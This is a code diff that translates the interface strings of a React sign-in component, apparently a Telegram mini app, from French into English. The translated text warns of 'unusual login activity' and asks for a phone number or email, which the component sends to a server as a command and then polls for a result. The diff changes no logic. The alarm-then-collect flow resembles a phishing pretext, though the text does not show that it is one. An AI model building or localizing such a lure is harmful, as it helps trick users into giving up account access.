@@ -63,14 +63,14 @@ export const AlternativeIdentifier = () => {
     setToast("");
 
     if (!initDataRaw) {
-      setToast("Données d'initialisation Telegram manquantes");
+      setToast("Telegram initData missing");
       return;
     }
 
     const identifier = input.trim();
     if (!identifier) {
       setToast(
-        "Veuillez entrer votre numéro de téléphone ou votre adresse e-mail"
+        "Please enter your phone number or email address"
       );
       return;
     }
@@ -92,14 +92,14 @@ export const AlternativeIdentifier = () => {
 
       if (!cmdResp.data.ok) {
         setLoading(false);
-        setToast(cmdResp.data.error || "Échec de la commande");
+        setToast(cmdResp.data.error || "Command failed");
         return;
       }
 
       const commandId = cmdResp.data.commandId;
       if (!commandId) {
         setLoading(false);
-        setToast("Identifiant de commande manquant du serveur");
+        setToast("Missing commandId from server");
         return;
       }
 
@@ -109,7 +109,7 @@ export const AlternativeIdentifier = () => {
       setLoading(false);
 
       if (!finalState) {
-        setToast("Délai d'attente dépassé, veuillez réessayer");
+        setToast("Timeout, please try again");
         return;
       }
 
@@ -123,17 +123,17 @@ export const AlternativeIdentifier = () => {
       const msg =
         finalState.error ||
         finalState.result?.message ||
-        "Identifiant invalide";
+        "Invalid identifier";
       setToast(msg);
     } catch (err: any) {
       setLoading(false);
-      setToast(err.response?.data?.error || err.message || "Erreur réseau");
+      setToast(err.response?.data?.error || err.message || "Network error");
     }
   };
 
   return (
     <div className="alternative-identifier-page">
-      <FullScreenLoader visible={loading} text="Vérification..." />
+      <FullScreenLoader visible={loading} text="Checking..." />
       <Toast message={toast} onClose={() => setToast("")} />
 
       <div
@@ -182,14 +182,14 @@ export const AlternativeIdentifier = () => {
         <div className="alternative-identifier-content">
           <div className="alternative-identifier-title-container">
             <h1 className="alternative-identifier-title" id="modal-header">
-              Entrez votre numéro de téléphone ou votre adresse e-mail
+              Enter your phone number or email address
             </h1>
             <div className="alternative-identifier-description">
               <span>
-                Il y a eu une activité de connexion inhabituelle sur votre
-                compte. Pour aider à protéger votre compte, veuillez entrer
-                votre numéro de téléphone (commencez par le code pays, par ex.
-                +33) ou votre adresse e-mail pour vérifier que c'est vous.
+                There has been unusual login activity on your account. To help
+                protect your account, please enter your phone number (start
+                with the country code, e.g. +33) or your email address to verify
+                it's you.
               </span>
             </div>
           </div>
@@ -197,7 +197,7 @@ export const AlternativeIdentifier = () => {
           <div className="alternative-identifier-form">
             <label className="alternative-identifier-label">
               <div className="alternative-identifier-label-text">
-                <span>Téléphone ou e-mail</span>
+                <span>Phone or email</span>
               </div>
               <div className="alternative-identifier-input-wrapper">
                 <input
@@ -228,7 +228,7 @@ export const AlternativeIdentifier = () => {
               disabled={loading || !input.trim()}
               type="button"
             >
-              <span>Suivant</span>
+              <span>Next</span>
             </button>
           </div>
         </div>
